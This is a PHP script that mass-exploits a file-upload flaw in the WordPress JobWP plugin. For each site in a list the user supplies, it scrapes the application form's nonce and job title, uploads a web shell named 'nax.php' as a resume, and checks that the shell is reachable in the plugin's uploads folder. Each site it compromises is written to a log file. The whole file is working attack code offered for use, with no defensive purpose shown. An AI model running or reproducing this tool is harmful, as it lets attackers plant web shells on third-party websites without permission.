<?php

class JobWP
{
    private $shell = "nax.php";

    private function requests($url, $post = null)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        if ($post) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }

        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $exec = curl_exec($ch);
        return $exec;
    }

    public function retrieveFields($url)
    {
        $request = $this->requests($url);
        
        $searchNonce = preg_match("/name=\"jobwp_apply_form_nonce_field\" value=\"(.*?)\"/", $request, $nonce);
        $searchJobTitle = preg_match("/value=\"(.*?)\" id=\"jobwp_apply_for\"/", $request, $jobTitle);

        if (!$searchNonce || !$searchJobTitle) {
            echo "[-] Failed getting " . (!$searchNonce ? "nonce" : "job title") . "\n\n";
            return false;
        }

        return (object) [
            "nonce" => $nonce[1],
            "jobTitle" => $jobTitle[1]
        ];
    }

    private function upload($url)
    {
        $parsed = parse_url($url);
        $retrieveFields = $this->retrieveFields($url);

        if ($retrieveFields == false) {
            echo "$retrieveFields";
            return false;
        }
        
        $postfields = [
            "jobwp_apply_form_nonce_field" => $retrieveFields->nonce,
            "_wp_http_referer" => $parsed["path"] . "/",
            "jobwp_apply_for" => $retrieveFields->jobTitle,
            "jobwp_full_name" => "Naxtarrr",
            "jobwp_email" => "nax@gmail.com",
            "jobwp_cover_letter" => "Tested",
            "jobwp_upload_resume" => new CURLFile("$this->shell")
        ];

        $this->requests($url, $postfields);

        $shell = $parsed["scheme"] . "://" . $parsed["host"] . "/wp-content/uploads/jobwp-resume/$this->shell";
        $check = $this->requests($shell);

        if (preg_match("/nax_file/", $check)) {
            echo "[+] $shell\n\n";

            if (!is_dir("exploited")) mkdir("exploited");
            
            $open = fopen("exploited/jobwp.txt", "a");
            fwrite($open, "$shell\n");
            fclose($open);
        } else {
            echo "[-] Shell failed\n\n";
        }
    }
    
    public function main()
    {
        $file = file_get_contents(readline("[+] Your list => "));
        $nineEleven = explode(PHP_EOL, $file);
        
        foreach ($nineEleven as $isBad) {
            echo "[*] $isBad\n";
            $this->upload($isBad);
        }
    }
}

$kelas = new JobWP();
$kelas->main();
